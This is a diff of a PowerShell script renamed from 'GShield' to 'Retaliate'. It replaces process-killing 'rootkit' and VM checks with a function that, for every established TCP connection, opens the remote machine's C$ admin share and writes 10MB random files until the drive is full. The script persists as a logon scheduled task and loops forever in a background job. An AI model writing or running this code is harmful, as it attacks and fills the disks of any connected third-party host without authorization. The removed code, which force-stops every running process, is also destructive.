@@ -1,4 +1,4 @@
-# GShield.ps1 by Gorstak
+# Retaliate.ps1 by Gorstak
 
 # Ensure the script isn't running multiple times
 $currentScript = $MyInvocation.MyCommand.Path
@@ -30,7 +30,7 @@ if ((Get-ExecutionPolicy) -eq "Restricted") {
 
 function Register-SystemLogonScript {
     param (
-        [string]$TaskName = "RunGShieldAtLogon"
+        [string]$TaskName = "RunRetaliateAtLogon"
     )
 
     # Define paths
@@ -66,59 +66,58 @@ function Register-SystemLogonScript {
 # Run the function
 Register-SystemLogonScript
 
-function Detect-RootkitByNetstat {
-    # Run netstat -ano and store the output
-    $netstatOutput = netstat -ano | Where-Object { $_ -match '\d+\.\d+\.\d+\.\d+:\d+' }
-
-    if (-not $netstatOutput) {
-        Write-Warning "No network connections found via netstat -ano. Possible rootkit hiding activity."
-
-        # Optionally: Log the suspicious event
-        $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
-        $logFile = "$env:TEMP\rootkit_suspected_$timestamp.log"
-        "Netstat -ano returned no results. Possible rootkit activity." | Out-File -FilePath $logFile
-
-        # Get all running processes (you could refine this)
-        $processes = Get-Process | Where-Object { $_.Id -ne $PID }
-
-        foreach ($proc in $processes) {
-            try {
-                # Comment this line if you want to observe first
-                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
-                Write-Output "Stopped process: $($proc.ProcessName) (PID: $($proc.Id))"
-            } catch {
-                Write-Warning "Could not stop process: $($proc.ProcessName) (PID: $($proc.Id))"
+function Fill-RemoteHostDriveWithGarbage {
+    try {
+        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
+        $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
+        if ($connections) {
+            foreach ($conn in $connections) {
+                $remoteIP = $conn.RemoteAddress
+                # Attempt to access the remote host's C$ share (admin share)
+                $remotePath = "\\$remoteIP\C$"
+                
+                # Check if the remote path is accessible (requires admin rights)
+                if (Test-Path $remotePath) {
+                    $counter = 1
+                    while ($true) {
+                        try {
+                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
+                            $garbage = [byte[]]::new(10485760) # 10MB in bytes
+                            (New-Object System.Random).NextBytes($garbage)
+                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
+                            Write-Host "Wrote 10MB to $filePath"
+                            $counter++
+                        }
+                        catch {
+                            # Stop if the drive is full or another error occurs
+                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
+                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
+                                break
+                            }
+                            else {
+                                Write-Host "Error writing to $filePath : $_"
+                                break
+                            }
+                        }
+                    }
+                }
+                else {
+                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
+                }
             }
         }
-    } else {
-        Write-Host "Netstat looks normal. Active connections detected."
-    }
-}
-
-function Stop-AllVMs {
-    $vmProcesses = @(
-        "vmware-vmx", "vmware", "vmware-tray", "vmwp", "vmnat", "vmnetdhcp", "vmware-authd", 
-        "vmms", "vmcompute", "vmsrvc", "vmwp", "hvhost", "vmmem", 
-        "VBoxSVC", "VBoxHeadless", "VirtualBoxVM", "VBoxManage", "qemu-system-x86_64", 
-        "qemu-system-i386", "qemu-system-arm", "qemu-system-aarch64", "kvm", "qemu-kvm", 
-        "prl_client_app", "prl_cc", "prl_tools_service", "prl_vm_app", "bhyve", "xen", 
-        "xenservice", "bochs", "dosbox", "utm", "wsl", "wslhost", "vmmem", "simics", 
-        "vbox", "parallels"
-    )
-    $processes = Get-Process -ErrorAction SilentlyContinue
-    $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
-    if ($vmRunning) {
-        $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
-        foreach ($process in $vmRunning) {
-            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+        else {
+            Write-Host "No incoming connections found."
         }
     }
+    catch {
+        Write-Host "General error: $_"
+    }
 }
 
-# Start background job
+# Run as a background job
 Start-Job -ScriptBlock {
     while ($true) {
-        Stop-AllVMs
-        Detect-RootkitByNetstat
-    }
-} | Out-Null
+        Fill-RemoteHostDriveWithGarbage
+        }
+}
